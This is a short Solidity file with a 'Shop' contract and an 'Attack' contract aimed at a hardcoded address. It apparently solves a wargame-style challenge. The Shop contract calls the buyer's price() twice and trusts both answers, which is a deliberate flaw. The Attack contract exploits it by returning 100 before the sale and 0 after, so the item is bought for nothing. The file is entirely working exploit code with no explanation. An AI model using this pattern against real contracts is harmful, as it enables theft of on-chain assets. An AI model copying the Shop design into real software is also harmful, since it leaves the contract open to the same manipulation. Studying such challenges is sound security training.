// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}


contract Attack is Buyer {
  
  Shop public shop;

  constructor() public {
    shop = Shop(0x2Ab328AB3A18865D86e04a6A382B6e92f17c3500);
  }

  function buyItem() public {
    shop.buy();
  }

  function price() public view override returns (uint) {
    bool soldStatus = shop.isSold();

    if (soldStatus == false) {
      return 100;
    } else if (soldStatus == true) {
      return 0;
    }
    }
}